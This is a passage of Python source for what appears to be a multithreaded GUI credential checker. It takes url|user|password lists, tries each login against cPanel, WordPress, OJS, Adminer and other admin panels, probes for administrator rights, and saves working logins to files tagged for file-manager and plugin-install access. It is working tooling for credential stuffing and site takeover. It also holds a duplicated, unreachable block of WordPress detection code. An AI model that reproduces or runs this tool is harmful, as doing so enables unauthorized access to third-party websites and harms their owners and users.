                self.log(f"  OJS LOGIN: Validation error: {str(e)[:50]}", "red")
            return (False, f"Validation error: {str(e)[:50]}")


    def check_ojs_admin_role_strict(self, session, url):
        """
        FIXED: Detect version PER JOURNAL, not per base URL
        """
        try:
            # Extract base URL
            if '/login' in url.lower():
                base_url = url.split('/login')[0]
            elif '/signIn' in url:
                base_url = url.split('/signIn')[0]
            else:
                base_url = url
            
            base_url = base_url.rstrip('/')
            
            if self.debug_mode.get():
                self.log(f"  OJS ADMIN: Base URL: {base_url}", "gray")
            
            from urllib.parse import urlparse
            parsed = urlparse(base_url)
            protocol_host = f"{parsed.scheme}://{parsed.netloc}"
            
            def detect_ojs_version(session, test_base_url):
                """Detect OJS version for specific journal URL"""
                try:
                    if self.debug_mode.get():
                        self.log(f"  OJS VERSION: Detecting version for {test_base_url[:50]}...", "cyan")
                    
                    try:
                        v3_test = session.get(f"{test_base_url}/management/settings", timeout=5, allow_redirects=True)
                        v3_text = v3_test.text.lower()
                        v3_url = v3_test.url.lower()
                        
                        v3_indicators = [
                            'journal settings',
                            'masthead',
                            'settings navigation',
                            'management pages',
                            'journal setup',
                        ]
                        
                        has_v3_content = any(ind in v3_text for ind in v3_indicators)
                        redirected_to_user = '/user' in v3_url and '/management' not in v3_url
                        
                        if has_v3_content and not redirected_to_user:
                            if self.debug_mode.get():
                                self.log(f"  OJS VERSION: ✓ OJS v3 detected", "green")
                            return 3
                    
                    except Exception as e:
                        if self.debug_mode.get():
                            self.log(f"  OJS VERSION: v3 test error: {str(e)[:30]}", "gray")
                    
                    try:
                        v2_test = session.get(f"{test_base_url}/manager", timeout=5, allow_redirects=True)
                        v2_text = v2_test.text.lower()
                        v2_url = v2_test.url.lower()
                        
                        v2_indicators = [
                            'journal management',
                            'setup',
                            'five steps',
                            'management pages',
                            'journal manager',
                        ]
                        
                        has_v2_content = any(ind in v2_text for ind in v2_indicators)
                        stayed_at_manager = '/manager' in v2_url
                        redirected_to_user = '/user' in v2_url and '/manager' not in v2_url
                        
                        if has_v2_content or stayed_at_manager:
                            if self.debug_mode.get():
                                self.log(f"  OJS VERSION: ✓ OJS v2 detected", "green")
                            return 2
                        
                        if redirected_to_user:
                            if self.debug_mode.get():
                                self.log(f"  OJS VERSION: ✓ OJS v2 detected (redirect pattern)", "green")
                            return 2
                    
                    except Exception as e:
                        if self.debug_mode.get():
                            self.log(f"  OJS VERSION: v2 test error: {str(e)[:30]}", "gray")
                    
                    if self.debug_mode.get():
                        self.log(f"  OJS VERSION: ⚠ Cannot detect, assuming v2", "yellow")
                    return 2
                
                except Exception as e:
                    if self.debug_mode.get():
                        self.log(f"  OJS VERSION: Detection error: {str(e)[:40]}", "yellow")
                    return 2
            
            import re
            match = re.search(r'/index\.php/([^/]+)/?$', base_url)
            
            should_search_all_journals = False
            
            if match:
                journal_code = match.group(1)
                
                if self.debug_mode.get():
                    self.log(f"  OJS ADMIN: Extracted from URL: '{journal_code}'", "gray")
                
                if journal_code.lower() == 'index':
                    if self.debug_mode.get():
                        self.log(f"  OJS ADMIN: '/index/' detected - this is site index (multi-journal)", "cyan")
                    should_search_all_journals = True
                
                elif journal_code.lower() in ['login', 'user']:
                    if self.debug_mode.get():
                        self.log(f"  OJS ADMIN: '{journal_code}' is reserved keyword - searching all journals...", "cyan")
                    should_search_all_journals = True
                
                else:
                    if self.debug_mode.get():
                        self.log(f"  OJS ADMIN: Found specific journal in URL: {journal_code}", "cyan")
                    
                    ojs_version = detect_ojs_version(session, base_url)
                    
                    if ojs_version == 2:
                        admin_endpoint = "/manager"
                        admin_check_path = "manager"
                    else:
                        admin_endpoint = "/management/settings"
                        admin_check_path = "management/settings"
                    
                    test_url = f"{base_url}{admin_endpoint}"
                    
                    try:
                        resp = session.get(test_url, timeout=10, allow_redirects=True)
                        final_url = resp.url.lower()
                        response_text = resp.text.lower()
                        
                        if self.debug_mode.get():
                            self.log(f"  OJS ADMIN: Test URL: {test_url}", "cyan")
                            self.log(f"  OJS ADMIN: Final URL: {final_url[:80]}", "cyan")
                            self.log(f"  OJS ADMIN: Status: {resp.status_code}", "cyan")
                        
                        is_denied = (
                            'authorizationdenied' in final_url or
                            'authorization' in final_url and 'denied' in final_url or
                            'message=user.authorization' in final_url or
                            'rolebasedaccessdenied' in final_url or
                            'authorization.rolebasedaccessdenied' in response_text or
                            'access denied' in response_text or
                            '/login' in final_url
                        )
                        
                        if ojs_version == 2:
                            if '/user' in final_url and admin_check_path not in final_url:
                                is_denied = True
                        
                        if is_denied:
                            if self.debug_mode.get():
                                self.log(f"  OJS ADMIN: ✗ NOT ADMIN - {journal_code} (access denied)", "red")
                            return (False, None, None, None, None)
                        
                        if resp.status_code == 200 and admin_check_path in final_url:
                            if self.debug_mode.get():
                                self.log(f"  OJS ADMIN: ✓ ADMIN - {journal_code} (OJS v{ojs_version})", "green")
                            
                            admin_url = f"{base_url}/login/signIn"
                            return (True, "Journal Manager/Administrator", ojs_version, admin_url, journal_code)
                        else:
                            if self.debug_mode.get():
                                self.log(f"  OJS ADMIN: ✗ NOT ADMIN - {journal_code} (wrong URL/status)", "red")
                            return (False, None, None, None, None)
                    
                    except Exception as e:
                        if self.debug_mode.get():
                            self.log(f"  OJS ADMIN: Test error: {str(e)[:40]}", "yellow")
                        return (False, None, None, None, None)
            
            else:
                if self.debug_mode.get():
                    self.log(f"  OJS ADMIN: No journal in URL - searching all journals...", "cyan")
                should_search_all_journals = True
            
            if should_search_all_journals:
                if self.debug_mode.get():
                    self.log(f"  OJS ADMIN: Scanning for all journals...", "cyan")
                    self.log(f"  OJS ADMIN: Getting journal list from HTML...", "cyan")
                
                try:
                    index_resp = session.get(protocol_host + "/index.php/index", timeout=8, allow_redirects=True)
                    html = index_resp.text
                except Exception as e:
                    if self.debug_mode.get():
                        self.log(f"  OJS ADMIN: Cannot get base URL: {str(e)[:40]}", "red")
                    return (False, None, None, None, None)
                
                pattern = r'/index\.php/([^/"\s\?#]+)/'
                matches = re.findall(pattern, html)
                
                excluded = {
                    'index', 'login', 'user', 'management', 'about',
                    'search', 'issue', 'article', 'workflow', 'submissions',
                    'reviewer', 'author', 'editor', 'sitemap', 'announcement',
                    'manager'
                }
                
                from collections import Counter
                candidates = [m for m in matches if m.lower() not in excluded and len(m) > 1]
                counter = Counter(candidates)
                
                journals = [name for name, count in counter.items() if count >= 2]
                
                if not journals:
                    journals = list(set(candidates))
                
                journals.sort(key=lambda x: counter[x], reverse=True)
                
                journals = journals[:20]
                
                if not journals:
                    if self.debug_mode.get():
                        self.log(f"  OJS ADMIN: ✗ No journals found in HTML", "yellow")
                    return (False, None, None, None, None)
                
                if self.debug_mode.get():
                    self.log(f"  OJS ADMIN: Found {len(journals)} journals to test", "cyan")
                
                for idx, journal in enumerate(journals, 1):
                    journal_base_url = f"{protocol_host}/index.php/{journal}"
                    
                    ojs_version = detect_ojs_version(session, journal_base_url)
                    
                    if ojs_version == 2:
                        admin_endpoint = "/manager"
                        admin_check_path = "manager"
                    else:
                        admin_endpoint = "/management/settings"
                        admin_check_path = "management/settings"
                    
                    test_url = f"{journal_base_url}{admin_endpoint}"
                    
                    if self.debug_mode.get():
                        self.log(f"  OJS ADMIN: Testing {idx}/{len(journals)}: {journal} (v{ojs_version})", "cyan")
                    
                    try:
                        resp = session.get(test_url, timeout=8, allow_redirects=True)
                        final_url = resp.url.lower()
                        response_text = resp.text.lower()
                        
                        is_denied = (
                            'authorizationdenied' in final_url or
                            'authorization' in final_url and 'denied' in final_url or
                            'message=user.authorization' in final_url or
                            'rolebasedaccessdenied' in final_url or
                            'authorization.rolebasedaccessdenied' in response_text or
                            'access denied' in response_text or
                            '/login' in final_url
                        )
                        
                        if ojs_version == 2:
                            if '/user' in final_url and '/manager' not in final_url:
                                is_denied = True
                        
                        if is_denied:
                            if self.debug_mode.get():
                                self.log(f"    ✗ {journal}: Access denied", "red")
                            continue
                        
                        if resp.status_code == 200 and admin_check_path in final_url:
                            if self.debug_mode.get():
                                self.log(f"    ✓ {journal}: ADMIN ACCESS! (OJS v{ojs_version})", "green")
                            
                            admin_url = f"{protocol_host}/index.php/{journal}/login/signIn"
                            return (True, "Journal Manager/Administrator", ojs_version, admin_url, journal)
                        
                        else:
                            if self.debug_mode.get():
                                self.log(f"    ✗ {journal}: Wrong status/URL", "red")
                    
                    except Exception as e:
                        if self.debug_mode.get():
                            self.log(f"    ⚠ {journal}: Error - {str(e)[:30]}", "yellow")
                        continue
                
                if self.debug_mode.get():
                    self.log(f"  OJS ADMIN: ✗ ALL {len(journals)} journals denied", "red")
                
                return (False, None, None, None, None)
            
            else:
                if self.debug_mode.get():
                    self.log(f"  OJS ADMIN: ✗ Unexpected code path reached", "red")
                return (False, None, None, None, None)
        
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  OJS ADMIN: Error: {str(e)[:60]}", "red")
            return (False, None, None, None, None)


    def check_login_ojs_upgraded(self, url, user, pwd):
        import requests
        import random
        
        s = requests.Session()
        s.verify = False
        s.headers.update({
            'User-Agent': random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': url
        })
        
        try:
            if not url.startswith('http'):
                url = f"https://{url}"
            
            if '/signIn' in url or '/login/signIn' in url:
                login_url = url
                if self.debug_mode.get():
                    self.log(f"  OJS: Using provided login URL: {url}", "cyan")
            elif '/login' in url and '/signIn' not in url:
                login_url = url.rstrip('/') + '/signIn'
                if self.debug_mode.get():
                    self.log(f"  OJS: Added /signIn to URL: {login_url}", "cyan")
            else:
                base = url.rstrip('/')
                login_url = base + '/login/signIn'
                
                if self.debug_mode.get():
                    self.log(f"  OJS: Constructed login URL: {login_url}", "cyan")
            
            login_data = {
                'username': user,
                'password': pwd,
                'remember': '1',
                'source': ''
            }
            
            if self.debug_mode.get():
                self.log(f"  OJS: POST to {login_url[:70]}", "cyan")
            
            try:
                get_resp = s.get(login_url, timeout=12)
            except:
                pass
            
            resp = s.post(login_url, data=login_data, timeout=15, allow_redirects=True)
            
            if self.debug_mode.get():
                self.log(f"  OJS: POST Status={resp.status_code}, Final URL={resp.url[:80]}", "cyan")
            
            valid, detail = self.validate_ojs_login_strict(s, url, resp)
            
            if valid:
                return ('SUCCESS', detail, login_url)
            else:
                return ('FAILED', detail, login_url)
        
        except requests.Timeout:
            return ('ERROR', 'Timeout', url)
        except requests.ConnectionError as e:
            return ('ERROR', 'Connection error', url)
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  OJS: Exception - {str(e)[:60]}", "yellow")
            return ('ERROR', str(e)[:100], url)

    def start(self):
        if self.running:
            return
        fp = self.file_path.get()
        if not fp or not os.path.exists(fp):
            messagebox.showerror("Error", "File not found!")
            return
        cms = self.selected_cms.get()
        if not cms:
            messagebox.showerror("Error", "CMS not detected!")
            return
        try:
            t = int(self.thread_count.get())
            if 1 <= t <= 500:
                self.max_threads = t
            else:
                raise ValueError
        except:
            messagebox.showerror("Error", "Threads: 1-500!")
            return

        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.output.delete(1.0, tk.END)
        
        self.show_banner()
        
        with self.ojs_cache_lock:
            self.ojs_cache.clear()
        
        self.log(f"▶ Starting {cms.upper()}", "cyan")
        self.log(f"▶ Threads: {self.max_threads} | Debug: {'ON' if self.debug_mode.get() else 'OFF'}", "gray")
        if cms == 'ojs':
            mode = "DEEP (slow, accurate)" if self.ojs_deep_check.get() else "FAST (pattern-based)"
            self.log(f"▶ OJS Detection: {mode}", "gray")
        threading.Thread(target=self.run, args=(fp, cms), daemon=True).start()

    def stop(self):
        self.running = False
        self.log("■ Stopped", "yellow")

    def run(self, fp, cms):
        try:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f if l.strip()]

            os.makedirs("result", exist_ok=True)
            
            cms_name_map = {
                'cpanel': 'cPanel',
                'wordpress': 'WordPress',
                'phpmyadmin': 'phpMyAdmin',
                'joomla': 'Joomla',
                'drupal': 'Drupal',
                'opencart': 'OpenCart',
                'moodle': 'Moodle',
                'ojs': 'OJS',
                'whm': 'WHM',
                'plesk': 'Plesk',
                'directadmin': 'DirectAdmin',
                'adminer': 'Adminer',
            }

            detected_cms_key = None
            input_filename = os.path.basename(fp).lower()

            for keyword in cms_name_map:
                if keyword in input_filename:
                    detected_cms_key = keyword
                    break

            if not detected_cms_key:
                detected_cms_key = cms

            cms_display_name = cms_name_map.get(detected_cms_key, detected_cms_key.capitalize())

            valid_file = f"result/Good_{cms_display_name}.txt"
            
            if cms == 'wordpress':
                fm_file = f"result/Good_WP_Filemanager.txt"
                app_file = f"result/Good_WP_Appearance.txt"
                plug_file = f"result/Good_WP_InstallPlugin.txt"
                admin_file = f"result/Good_WP_Access.txt"
            elif cms == 'ojs':
                admin_file = f"result/Good_OJS_Admin.txt"
                fm_file = app_file = plug_file = None
            else:
                fm_file = app_file = plug_file = admin_file = None

            self.update_stat("Total", len(lines))

            for i, line in enumerate(lines, 1):
                if not self.running:
                    break
                while len(self.threads) >= self.max_threads:
                    time.sleep(0.1)
                    self.threads = [t for t in self.threads if t.is_alive()]

                t = threading.Thread(target=self.check, args=(line, cms, valid_file, fm_file, app_file, plug_file, admin_file, i), daemon=True)
                t.start()
                self.threads.append(t)

            for t in self.threads:
                t.join()

            self.log("✓ Complete! Check 'result/' folder", "green")
            
        except Exception as e:
            self.log(f"✗ Critical: {e}", "red")
        finally:
            self.running = False
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)

    def detect_adminer_login_form(self, url):
        try:
            if not url.startswith('http'):
                url = f"https://{url}"
            
            if self.debug_mode.get():
                self.log(f"  ADMINER PRE-CHECK: {url[:70]}", "cyan")
            
            s = requests.Session()
            s.verify = False
            s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
            
            try:
                resp = s.get(url, timeout=10, allow_redirects=True)
            except requests.Timeout:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✗ Timeout", "red")
                return (False, "Timeout")
            except requests.ConnectionError:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✗ Connection error", "red")
                return (False, "Connection error")
            
            if resp.status_code == 404:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✗ 404 Not Found", "red")
                return (False, "404 Not Found")
            
            if resp.status_code >= 500:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✗ {resp.status_code} Server Error", "red")
                return (False, f"{resp.status_code} Server Error")
            
            if resp.status_code == 403:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✗ 403 Forbidden", "red")
                return (False, "403 Forbidden")
            
            if len(resp.text) < 500:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✗ Response too small ({len(resp.text)} bytes)", "red")
                return (False, "Response too small")
            
            txt = resp.text
            txt_lower = txt.lower()
            
            adminer_indicators = {
                'adminer': 3,
                'login to database': 2,
                'auth[driver]': 3,
                'auth[server]': 3,
                'auth[username]': 3,
                'auth[password]': 3,
                'name="auth[driver]"': 2,
                'name="auth[server]"': 2,
                'pemuda.cz': 1,
                'jakub vrana': 1,
            }
            
            score = 0
            found = []
            
            for indicator, points in adminer_indicators.items():
                if indicator in txt_lower:
                    score += points
                    found.append(indicator)
            
            if self.debug_mode.get():
                self.log(f"  ADMINER PRE-CHECK: Score={score} ({len(found)} indicators)", "cyan")
                if found:
                    self.log(f"  ADMINER PRE-CHECK: Found: {', '.join(found[:4])}", "gray")
            
            if score >= 5:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✓ Adminer confirmed (score: {score})", "green")
                return (True, "Adminer form detected")
            
            has_auth_fields = (
                'auth[username]' in txt_lower and 
                'auth[password]' in txt_lower
            )
            
            if has_auth_fields and 'adminer' in txt_lower:
                if self.debug_mode.get():
                    self.log(f"  ADMINER PRE-CHECK: ✓ Adminer detected (auth fields present)", "green")
                return (True, "Adminer form detected")
            
            if self.debug_mode.get():
                self.log(f"  ADMINER PRE-CHECK: ✗ Not Adminer (score: {score})", "red")
            return (False, f"Not Adminer (score: {score})")
        
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  ADMINER PRE-CHECK: ✗ Error: {str(e)[:50]}", "red")
            return (False, f"Error: {str(e)[:50]}")
        try:
            if not url.startswith('http'):
                url = f"https://{url}"
            
            login_url = url.rstrip('/') + '/wp-login.php'
            
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: {login_url[:70]}", "cyan")
            
            s = requests.Session()
            s.verify = False
            s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
            
            try:
                resp = s.get(login_url, timeout=10, allow_redirects=True)
            except requests.Timeout:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ Timeout", "red")
                return (False, "Timeout")
            except requests.ConnectionError:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ Connection error", "red")
                return (False, "Connection error")
            
            if resp.status_code == 404:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ 404 Not Found", "red")
                return (False, "404 Not Found")
            
            if resp.status_code >= 500:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ {resp.status_code} Server Error", "red")
                return (False, f"{resp.status_code} Server Error")
            
            if resp.status_code == 403:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ 403 Forbidden", "red")
                return (False, "403 Forbidden")
            
            if len(resp.text) < 500:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ Response too small ({len(resp.text)} bytes)", "red")
                return (False, "Response too small")
            
            txt = resp.text
            txt_lower = txt.lower()
            
            has_username_field = 'name="log"' in txt
            has_password_field = 'name="pwd"' in txt
            has_submit_button = 'name="wp-submit"' in txt or 'id="wp-submit"' in txt
            
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: log={has_username_field}, pwd={has_password_field}, submit={has_submit_button}", "cyan")
            
            if not (has_username_field and has_password_field and has_submit_button):
                missing = []
                if not has_username_field:
                    missing.append('name="log"')
                if not has_password_field:
                    missing.append('name="pwd"')
                if not has_submit_button:
                    missing.append('wp-submit')
                
                reason = f"Not WP form (missing: {', '.join(missing)})"
                
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ {reason}", "red")
                
                return (False, reason)
            
            wp_branding = {
                'wordpress': 2,
                'wp-logo': 2,
                'login_error': 1,
                'rememberme': 1,
                'user_login': 1,
                'loginform': 1,
                'wp-core-ui': 1,
            }
            
            branding_score = 0
            found = []
            
            for indicator, score in wp_branding.items():
                if indicator in txt_lower:
                    branding_score += score
                    found.append(indicator)
            
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: Branding={branding_score} ({', '.join(found[:3])})", "cyan")
            
            if branding_score >= 2:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✓ WordPress confirmed (score: {branding_score})", "green")
                return (True, "WordPress form detected")
            
            elif branding_score >= 1:
                if 'wordpress' in txt_lower or 'wp-' in txt_lower:
                    if self.debug_mode.get():
                        self.log(f"  WP PRE-CHECK: ✓ WordPress detected (weak branding)", "green")
                    return (True, "WordPress form detected")
                else:
                    if self.debug_mode.get():
                        self.log(f"  WP PRE-CHECK: ✗ No WordPress branding", "red")
                    return (False, "Not WordPress (no branding)")
            
            else:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ No branding (score: {branding_score})", "red")
                return (False, "Not WordPress (no branding)")
        
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: ✗ Error: {str(e)[:50]}", "red")
            return (False, f"Error: {str(e)[:50]}")

    def detect_wordpress_login_form(self, url):
        try:
            if not url.startswith('http'):
                url = f"https://{url}"
            
            login_url = url.rstrip('/') + '/wp-login.php'
            
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: {login_url[:70]}", "cyan")
            
            s = requests.Session()
            s.verify = False
            s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
            
            try:
                resp = s.get(login_url, timeout=10, allow_redirects=True)
            except requests.Timeout:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ Timeout", "red")
                return (False, "Timeout")
            except requests.ConnectionError:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ Connection error", "red")
                return (False, "Connection error")
            
            if resp.status_code == 404:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ 404 Not Found", "red")
                return (False, "404 Not Found")
            
            if resp.status_code >= 500:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ {resp.status_code} Server Error", "red")
                return (False, f"{resp.status_code} Server Error")
            
            if resp.status_code == 403:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ 403 Forbidden", "red")
                return (False, "403 Forbidden")
            
            if len(resp.text) < 500:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ Response too small ({len(resp.text)} bytes)", "red")
                return (False, "Response too small")
            
            txt = resp.text
            txt_lower = txt.lower()
            
            has_username_field = 'name="log"' in txt
            has_password_field = 'name="pwd"' in txt
            has_submit_button = 'name="wp-submit"' in txt or 'id="wp-submit"' in txt
            
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: log={has_username_field}, pwd={has_password_field}, submit={has_submit_button}", "cyan")
            
            if not (has_username_field and has_password_field and has_submit_button):
                missing = []
                if not has_username_field:
                    missing.append('name="log"')
                if not has_password_field:
                    missing.append('name="pwd"')
                if not has_submit_button:
                    missing.append('wp-submit')
                
                reason = f"Not WP form (missing: {', '.join(missing)})"
                
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ {reason}", "red")
                
                return (False, reason)
            
            wp_branding = {
                'wordpress': 2,
                'wp-logo': 2,
                'login_error': 1,
                'rememberme': 1,
                'user_login': 1,
                'loginform': 1,
                'wp-core-ui': 1,
            }
            
            branding_score = 0
            found = []
            
            for indicator, score in wp_branding.items():
                if indicator in txt_lower:
                    branding_score += score
                    found.append(indicator)
            
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: Branding={branding_score} ({', '.join(found[:3])})", "cyan")
            
            if branding_score >= 2:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✓ WordPress confirmed (score: {branding_score})", "green")
                return (True, "WordPress form detected")
            
            elif branding_score >= 1:
                if 'wordpress' in txt_lower or 'wp-' in txt_lower:
                    if self.debug_mode.get():
                        self.log(f"  WP PRE-CHECK: ✓ WordPress detected (weak branding)", "green")
                    return (True, "WordPress form detected")
                else:
                    if self.debug_mode.get():
                        self.log(f"  WP PRE-CHECK: ✗ No WordPress branding", "red")
                    return (False, "Not WordPress (no branding)")
            
            else:
                if self.debug_mode.get():
                    self.log(f"  WP PRE-CHECK: ✗ No branding (score: {branding_score})", "red")
                return (False, "Not WordPress (no branding)")
        
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  WP PRE-CHECK: ✗ Error: {str(e)[:50]}", "red")
            return (False, f"Error: {str(e)[:50]}")

    def check(self, line, cms, valid_file, fm_file, app_file, plug_file, admin_file, ln):
        parts = line.split('|')
        if len(parts) != 3:
            self.log(f"⚠ Bad format: {line}", "yellow")
            self.incr_stat("⚠ Err")
            return

        url, user, pwd = [p.strip() for p in parts]
        if not url.startswith('http'):
            url = f"https://{url}"

        try:
            if cms == 'wordpress':
                is_wp, reason = self.detect_wordpress_login_form(url)
                
                if not is_wp:
                    self.log(f"⚠ SKIP: {url[:60]} - {reason}", "yellow")
                    self.incr_stat("⚠ Err")
                    self.update_stat("Done", ln)
                    return
                
                if self.debug_mode.get():
                    self.log(f"  ✓ WordPress form confirmed - proceeding", "green")

            if cms == 'adminer':
                is_adminer, reason = self.detect_adminer_login_form(url)
                
                if not is_adminer:
                    self.log(f"⚠ SKIP: {url[:60]} - {reason}", "yellow")
                    self.incr_stat("⚠ Err")
                    self.update_stat("Done", ln)
                    return
                
                if self.debug_mode.get():
                    self.log(f"  ✓ Adminer form confirmed - proceeding", "green")

            if cms == 'ojs':
                from urllib.parse import urlparse
                parsed = urlparse(url)
                domain = parsed.netloc
                
                is_cached = domain in self.ojs_cache
                
                if self.debug_mode.get() and not is_cached:
                    self.log(f"DEBUG: Verifying if {domain} is OJS...", "cyan")
                
                is_ojs = self.detect_ojs_from_url(url, deep_check=self.ojs_deep_check.get())
                
                if not is_ojs:
                    self.log(f"⚠ NOT OJS: {url[:60]} (skipped)", "yellow")
                    self.incr_stat("⚠ Err")
                    self.update_stat("Done", ln)
                    return
                
                if self.debug_mode.get() and not is_cached:
                    self.log(f"  ✓ Confirmed OJS: {domain}", "green")
            
            if cms == 'ojs':
                result = self.check_login_ojs_upgraded(url, user, pwd)
            else:
                result = self.check_login(cms, url, user, pwd)

            if len(result) == 3:
                status, reason, actual_url = result
            else:
                status, reason = result
                actual_url = url

            if status == 'SUCCESS':
                domain_info = ""
                if 'CPANEL_DOMAINS|' in str(reason):
                    domain_info = reason.split('|')[1]
                    reason = "Authenticated"
                
                if cms == 'cpanel' and domain_info:
                    with open(valid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{actual_url}|{user}|{pwd}    -->    Domains: {domain_info}\n")
                    msg = f"✓ VALID: {actual_url} | {user}"
                else:
                    with open(valid_file, 'a', encoding='utf-8', buffering=1) as f:
                        f.write(f"{actual_url}|{user}|{pwd}\n")
                        f.flush()
                    msg = f"✓ VALID: {actual_url} | {user}"
                
                if self.debug_mode.get():
                    msg += f" | {pwd}"
                self.log(msg, "green")
                
                if cms == 'cpanel' and domain_info:
                    self.log(f"  └─ 🌐 Domains: {domain_info}", "magenta")
                
                self.incr_stat("✓ Valid")

                if cms == 'wordpress':
                    session = None
                    
                    if reason and reason != "Authenticated":
                        if hasattr(reason, 'get') and hasattr(reason, 'cookies') and hasattr(reason, 'post'):
                            session = reason
                            if self.debug_mode.get():
                                self.log(f"  WP: ✓ Session object validated", "cyan")
                        else:
                            self.log(f"  WP: ✗ Invalid reason type: {type(reason)}", "red")
                    else:
                        self.log(f"  WP: ✗ No session (reason={reason})", "red")
                    
                    if session:
                        is_admin = False
                        detection_method = None
                        admin_score = 0
                        strong_indicator_count = 0
                        
                        try:
                            if '/wp-login.php' in url:
                                base_url = url.split('/wp-login.php')[0]
                            else:
                                base_url = url.rstrip('/')
                            
                            dashboard_url = f"{base_url}/wp-admin/"
                            
                            if self.debug_mode.get():
                                self.log(f"  WP: Base URL: {base_url}", "gray")
                                self.log(f"  WP: Dashboard URL: {dashboard_url}", "gray")
                            
                            if self.debug_mode.get():
                                self.log(f"  WP: Testing dashboard access...", "cyan")
                            
                            dash_resp = session.get(dashboard_url, timeout=10, allow_redirects=True)
                            
                            final_url = dash_resp.url.lower()
                            status_code = dash_resp.status_code
                            
                            if self.debug_mode.get():
                                self.log(f"  WP: Dashboard → {status_code} | {final_url[:60]}", "cyan")
                            
                            import re
                            is_in_wp_admin = bool(re.search(r'/wp-admin/?', final_url))
                            is_not_login = 'wp-login.php' not in final_url
                            
                            if self.debug_mode.get():
                                self.log(f"  WP: in_admin={is_in_wp_admin} | not_login={is_not_login}", "cyan")
                            
                            if status_code == 200 and is_in_wp_admin and is_not_login:
                                txt = dash_resp.text
                                txt_lower = txt.lower()
                                
                                if self.debug_mode.get():
                                    self.log(f"  WP: Analyzing ({len(txt)} bytes)...", "cyan")
                                
                                has_howdy = 'howdy' in txt_lower and 'howdy,' in txt_lower
                                has_dashboard_widgets = ('id="dashboard-widgets"' in txt_lower or 
                                                    'class="dashboard-widgets' in txt_lower)
                                
                                has_admin_menu = ('id="adminmenu"' in txt_lower or 
                                                'id="adminmenumain"' in txt_lower)
                                
                                has_admin_bar = ('id="wpadminbar"' in txt_lower or 
                                                'id="wp-admin-bar' in txt_lower)
                                
                                has_welcome_panel = 'id="welcome-panel"' in txt_lower
                                
                                has_screen_options = 'id="screen-options-wrap' in txt_lower
                                has_edit_themes = ('theme-editor.php' in txt_lower or 
                                                'customize.php' in txt_lower)
                                
                                has_admin_ajax = 'admin-ajax.php' in txt_lower
                                has_load_scripts = 'load-scripts.php' in txt_lower
                                has_admin_css = '/wp-admin/css/' in txt_lower
                                has_admin_js = '/wp-admin/js/' in txt_lower
                                has_dashicons = 'dashicons.min.css' in txt_lower
                                has_logout_link = 'wp-login.php?action=logout' in txt_lower
                                
                                has_wp_content = 'id="wpcontent"' in txt_lower
                                has_wp_footer = 'id="wpfooter"' in txt_lower
                                
                                found_indicators = []
                                
                                if has_howdy:
                                    admin_score += 5
                                    strong_indicator_count += 1
                                    found_indicators.append('howdy(5)')
                                
                                if has_dashboard_widgets:
                                    admin_score += 5
                                    strong_indicator_count += 1
                                    found_indicators.append('dashboard_widgets(5)')
                                
                                if has_admin_menu:
                                    admin_score += 4
                                    strong_indicator_count += 1
                                    found_indicators.append('admin_menu(4)')
                                
                                if has_admin_bar:
                                    admin_score += 4
                                    strong_indicator_count += 1
                                    found_indicators.append('admin_bar(4)')
                                
                                if has_welcome_panel:
                                    admin_score += 4
                                    strong_indicator_count += 1
                                    found_indicators.append('welcome_panel(4)')
                                
                                if has_screen_options:
                                    admin_score += 3
                                    found_indicators.append('screen_options(3)')
                                
                                if has_edit_themes:
                                    admin_score += 3
